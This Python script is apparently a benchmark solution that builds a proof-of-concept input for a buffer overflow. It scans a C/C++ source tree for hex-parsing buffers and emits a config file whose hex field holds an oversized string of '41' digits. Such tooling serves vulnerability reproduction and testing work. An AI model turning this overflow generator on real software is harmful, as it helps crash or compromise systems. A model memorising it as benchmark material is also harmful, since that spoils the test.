import os
import re
import tarfile
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)
        try:
            info = self._analyze_source(root)
            template = self._find_best_config_template(root)
            payload_digits_len = self._choose_payload_digits_len(info)
            payload_digits = ("41" * (payload_digits_len // 2))[:payload_digits_len]
            minimal = self._build_poc_from_template_or_source(template, root, payload_digits)
            if minimal is not None and len(minimal) > 0:
                return minimal
            key = self._infer_hex_key_from_source(root) or "hex"
            return (f"{key}=0x{payload_digits}\n").encode("ascii", "ignore")
        finally:
            self._cleanup_root(root)

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = tempfile.TemporaryDirectory(prefix="poc_src_")
        self._tmpdir = tmpdir
        root = tmpdir.name
        self._safe_extract_tar(src_path, root)
        return root

    def _cleanup_root(self, root: str) -> None:
        tmpdir = getattr(self, "_tmpdir", None)
        if tmpdir is not None:
            try:
                tmpdir.cleanup()
            except Exception:
                pass
            self._tmpdir = None

    def _safe_extract_tar(self, tar_path: str, dest: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            for member in tf.getmembers():
                if member.islnk() or member.issym():
                    continue
                name = member.name
                if not name:
                    continue
                if name.startswith("/") or name.startswith("\\"):
                    continue
                norm = os.path.normpath(name)
                if norm.startswith("..") or norm.startswith("../") or norm.startswith("..\\"):
                    continue
                target = os.path.join(dest, norm)
                dest_abs = os.path.abspath(dest)
                target_abs = os.path.abspath(target)
                if not (target_abs == dest_abs or target_abs.startswith(dest_abs + os.sep)):
                    continue
                tf.extract(member, dest)

    def _iter_files(self, root: str, max_size: int = 2_000_000) -> List[str]:
        out = []
        for dp, dn, fn in os.walk(root):
            for f in fn:
                p = os.path.join(dp, f)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                out.append(p)
        return out

    def _read_text(self, path: str, max_bytes: int = 2_000_000) -> Optional[str]:
        try:
            data = Path(path).read_bytes()
        except Exception:
            return None
        if not data or len(data) > max_bytes:
            return None
        if b"\x00" in data[:4096]:
            return None
        try:
            return data.decode("utf-8", "replace")
        except Exception:
            try:
                return data.decode("latin-1", "replace")
            except Exception:
                return None

    def _analyze_source(self, root: str) -> Dict[str, int]:
        src_ext = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
        files = []
        for p in self._iter_files(root):
            if Path(p).suffix.lower() in src_ext:
                files.append(p)

        hex_related_str_sizes: List[int] = []
        hex_related_byte_sizes: List[int] = []
        linebuf_sizes: List[int] = []

        kw_re = re.compile(r"(isxdigit|strtoul|hex|0x)", re.IGNORECASE)
        char_arr_re = re.compile(r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*(\d{1,6})\s*\]")
        byte_arr_re = re.compile(r"\b(?:unsigned\s+char|uint8_t|u8)\s+([A-Za-z_]\w*)\s*\[\s*(\d{1,6})\s*\]")
        fgets_re = re.compile(r"\bfgets\s*\(\s*([A-Za-z_]\w*)\s*,")
        getline_re = re.compile(r"\bgetline\s*\(")

        for p in files:
            txt = self._read_text(p)
            if not txt:
                continue
            is_hex_related = kw_re.search(txt) is not None
            if not is_hex_related and ("fgets" not in txt and "getline" not in txt):
                continue

            char_arrays: Dict[str, int] = {}
            for m in char_arr_re.finditer(txt):
                name = m.group(1)
                try:
                    size = int(m.group(2))
                except Exception:
                    continue
                if 0 < size <= 1_000_000 and name not in char_arrays:
                    char_arrays[name] = size

            if "fgets" in txt and char_arrays:
                for m in fgets_re.finditer(txt):
                    var = m.group(1)
                    if var in char_arrays:
                        sz = char_arrays[var]
                        if 8 <= sz <= 32768:
                            linebuf_sizes.append(sz)

            if getline_re.search(txt):
                linebuf_sizes.append(1_000_000_000)

            if is_hex_related:
                for m in char_arr_re.finditer(txt):
                    name = m.group(1)
                    try:
                        size = int(m.group(2))
                    except Exception:
                        continue
                    if size <= 0 or size > 20000:
                        continue
                    lname = name.lower()
                    if any(k in lname for k in ("hex", "key", "val", "value", "buf", "tmp", "data", "line", "str")):
                        hex_related_str_sizes.append(size)

                for m in byte_arr_re.finditer(txt):
                    name = m.group(1)
                    try:
                        size = int(m.group(2))
                    except Exception:
                        continue
                    if size <= 0 or size > 20000:
                        continue
                    lname = name.lower()
                    if any(k in lname for k in ("hex", "key", "val", "value", "buf", "tmp", "data")):
                        hex_related_byte_sizes.append(size)

        str_candidate = self._pick_reasonable_size(hex_related_str_sizes, lo=64, hi=4096, prefer=(512, 256, 1024, 128))
        byte_candidate = self._pick_reasonable_size(hex_related_byte_sizes, lo=16, hi=4096, prefer=(256, 128, 512, 64))
        line_candidate = self._pick_reasonable_size(linebuf_sizes, lo=64, hi=1_000_000_000, prefer=(1024, 2048, 4096, 512))

        return {
            "str_buf": str_candidate,
            "byte_buf": byte_candidate,
            "line_buf": line_candidate,
        }

    def _pick_reasonable_size(self, sizes: List[int], lo: int, hi: int, prefer: Tuple[int, ...]) -> int:
        if not sizes:
            return 0
        filtered = [s for s in sizes if lo <= s <= hi]
        if not filtered:
            return 0
        counts: Dict[int, int] = {}
        for s in filtered:
            counts[s] = counts.get(s, 0) + 1
        for pr in prefer:
            if pr in counts:
                return pr
        best = max(counts.items(), key=lambda kv: (kv[1], kv[0]))[0]
        return best

    def _choose_payload_digits_len(self, info: Dict[str, int]) -> int:
        base = 512
        str_buf = info.get("str_buf", 0) or 0
        byte_buf = info.get("byte_buf", 0) or 0
        line_buf = info.get("line_buf", 0) or 0

        need = base
        if str_buf:
            need = max(need, str_buf)
        if byte_buf:
            need = max(need, 2 * byte_buf)

        if need < 128:
            need = 512
        if need > 4096:
            need = 4096

        if need % 2 == 1:
            need += 1

        if line_buf and 64 <= line_buf <= 32768:
            overhead = 32
            max_digits = max(128, line_buf - overhead)
            if max_digits % 2 == 1:
                max_digits -= 1
            if max_digits >= 128:
                need = min(need, max_digits)

        return max(128, need)

    def _find_best_config_template(self, root: str) -> Optional[Tuple[str, str]]:
        exts = {
            ".conf", ".cfg", ".ini", ".cnf", ".config", ".rc", ".toml",
            ".yaml", ".yml", ".json", ".txt"
        }
        name_hints = ("conf", "config", "cfg", "ini", "toml", "yaml", "yml", "json", "rc", "sample", "example", "default")
        best: Optional[Tuple[int, int, str, str]] = None  # (-score, size, path, text)
        for p in self._iter_files(root, max_size=200_000):
            bn = os.path.basename(p).lower()
            suf = Path(p).suffix.lower()
            if suf not in exts and not any(h in bn for h in name_hints):
                continue
            txt = self._read_text(p, max_bytes=200_000)
            if not txt:
                continue
            if len(txt) < 6:
                continue

            hex_cnt = len(re.findall(r"0[xX][0-9A-Fa-f]{2,}", txt))
            long_hex_cnt = len(re.findall(r"\b[0-9A-Fa-f]{16,}\b", txt))
            score = hex_cnt * 20 + long_hex_cnt * 3
            ltxt = txt.lower()
            if "hex" in ltxt:
                score += 8
            if "=" in txt:
                score += 3
            if ":" in txt:
                score += 1
            if "[" in txt and "]" in txt:
                score += 1
            if score <= 0:
                continue

            size = len(txt.encode("utf-8", "ignore"))
            key = (-score, size)
            if best is None or key < (best[0], best[1]):
                best = (key[0], key[1], p, txt)
        if best is None:
            return None
        return (best[2], best[3])

    def _build_poc_from_template_or_source(self, template: Optional[Tuple[str, str]], root: str, payload_digits: str) -> Optional[bytes]:
        if template is None:
            return None
        path, txt = template

        matches = list(re.finditer(r"0[xX]([0-9A-Fa-f]{2,})", txt))
        if not matches:
            matches2 = list(re.finditer(r"(?<![0-9A-Fa-f])([0-9A-Fa-f]{16,})(?![0-9A-Fa-f])", txt))
            if matches2:
                chosen = self._choose_best_hex_match(txt, matches2, no_prefix=True)
                if chosen is None:
                    return None
                start, end, orig = chosen
                repl = payload_digits
                new_txt = txt[:start] + repl + txt[end:]
                return self._minimalize_or_full(path, txt, new_txt, payload_digits, orig_prefix="")
            return None

        chosen = self._choose_best_hex_match(txt, matches, no_prefix=False)
        if chosen is None:
            return None
        start, end, orig = chosen
        orig_prefix = orig[:2]
        repl = orig_prefix + payload_digits
        new_txt = txt[:start] + repl + txt[end:]
        return self._minimalize_or_full(path, txt, new_txt, payload_digits, orig_prefix=orig_prefix)

    def _choose_best_hex_match(self, txt: str, matches: List[re.Match], no_prefix: bool) -> Optional[Tuple[int, int, str]]:
        best = None
        for m in matches:
            start, end = m.span(0 if not no_prefix else 1)
            frag = txt[start:end]
            line_start = txt.rfind("\n", 0, start) + 1
            line_end = txt.find("\n", end)
            if line_end == -1:
                line_end = len(txt)
            line = txt[line_start:line_end]
            lline = line.lower()

            s = 0
            if "hex" in lline:
                s += 12
            if any(k in lline for k in ("key", "secret", "seed", "token", "uuid", "id", "mac", "hash", "digest")):
                s += 6
            if "=" in line:
                s += 3
            if ":" in line:
                s += 2
            if '"' in line or "'" in line:
                s += 1
            s += min(20, len(frag) // 8)

            if best is None or s > best[0]:
                best = (s, start, end, frag)
        if best is None:
            return None
        return (best[1], best[2], best[3])

    def _minimalize_or_full(self, path: str, old_txt: str, new_txt: str, payload_digits: str, orig_prefix: str) -> bytes:
        suf = Path(path).suffix.lower()
        stripped = old_txt.lstrip()
        is_json = (suf == ".json") or (stripped.startswith("{") or stripped.startswith("["))
        is_yaml = suf in (".yaml", ".yml")
        is_toml = suf == ".toml"
        is_ini_like = suf in (".ini", ".conf", ".cfg", ".cnf", ".config", ".rc") or ("[" in old_txt and "]" in old_txt and "=" in old_txt)

        # Try to build a minimal config around the edited line; fallback to full edited template if unsure.
        edited_pos = self._first_diff_pos(old_txt, new_txt)
        if edited_pos is None:
            return new_txt.encode("utf-8", "ignore")

        line_start = new_txt.rfind("\n", 0, edited_pos) + 1
        line_end = new_txt.find("\n", edited_pos)
        if line_end == -1:
            line_end = len(new_txt)
        edited_line = new_txt[line_start:line_end]

        if is_json:
            # Attempt to extract a JSON key on the edited line.
            km = re.search(r'"([^"]+)"\s*:\s*', edited_line)
            if km:
                key = km.group(1)
                # Preserve whether original value was quoted
                quoted = bool(re.search(r'"[^"]*"\s*:\s*"', edited_line))
                v = (orig_prefix + payload_digits) if orig_prefix else payload_digits
                if quoted:
                    minimal = '{' + f'"{self._json_escape(key)}":"{v}"' + '}\n'
                else:
                    minimal = '{' + f'"{self._json_escape(key)}":{v}' + '}\n'
                return minimal.encode("utf-8", "ignore")
            return new_txt.encode("utf-8", "ignore")

        if is_yaml:
            # Use "key: value" from edited line when possible.
            km = re.match(r"\s*([A-Za-z0-9_.-]+)\s*:\s*", edited_line)
            v = (orig_prefix + payload_digits) if orig_prefix else payload_digits
            if km:
                key = km.group(1)
                minimal = f"{key}: {v}\n"
                return minimal.encode("utf-8", "ignore")
            return (edited_line.strip() + "\n").encode("utf-8", "ignore")

        if is_toml or is_ini_like:
            # Include nearest preceding INI section header if present.
            section = self._find_nearest_section_header(old_txt, line_start)
            minimal_lines = []
            if section:
                minimal_lines.append(section.rstrip("\r\n"))
            minimal_lines.append(edited_line.rstrip("\r\n"))
            minimal = "\n".join(minimal_lines) + "\n"
            return minimal.encode("utf-8", "ignore")

        return (edited_line.strip() + "\n").encode("utf-8", "ignore")

    def _find_nearest_section_header(self, txt: str, before_pos: int) -> Optional[str]:
        i = before_pos
        if i < 0:
            i = 0
        prev = txt.rfind("\n", 0, i)
        while prev != -1:
            prev2 = txt.rfind("\n", 0, prev)
            line = txt[prev2 + 1:prev].strip()
            if line.startswith("[") and line.endswith("]") and len(line) >= 3:
                return line
            prev = prev2
        line0 = txt[:i].strip()
        if line0.startswith("[") and line0.endswith("]") and "\n" not in line0:
            return line0
        return None

    def _first_diff_pos(self, a: str, b: str) -> Optional[int]:
        n = min(len(a), len(b))
        for i in range(n):
            if a[i] != b[i]:
                return i
        if len(a) != len(b):
            return n
        return None

    def _infer_hex_key_from_source(self, root: str) -> Optional[str]:
        src_ext = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
        key_scores: Dict[str, int] = {}
        key_re = re.compile(r'\b(?:strcmp|strcasecmp|strncmp|strncasecmp)\s*\(\s*[A-Za-z_]\w*\s*,\s*"([^"]+)"')
        txt_cache = []
        for p in self._iter_files(root):
            if Path(p).suffix.lower() not in src_ext:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            if "hex" not in txt.lower() and "0x" not in txt.lower():
                continue
            txt_cache.append(txt)

        for txt in txt_cache:
            for m in key_re.finditer(txt):
                k = m.group(1)
                if not (1 <= len(k) <= 64):
                    continue
                if not re.fullmatch(r"[A-Za-z0-9_.:-]+", k):
                    continue
                lk = k.lower()
                s = 0
                if "hex" in lk:
                    s += 30
                if any(t in lk for t in ("key", "seed", "secret", "token", "uuid", "id", "mac", "hash", "digest")):
                    s += 10
                if any(t in lk for t in ("conf", "cfg", "config", "opt", "option")):
                    s += 2
                if len(k) <= 8:
                    s += 1
                key_scores[k] = key_scores.get(k, 0) + s

        if not key_scores:
            return None
        return max(key_scores.items(), key=lambda kv: kv[1])[0]

    def _json_escape(self, s: str) -> str:
        return s.replace("\\", "\\\\").replace('"', '\\"')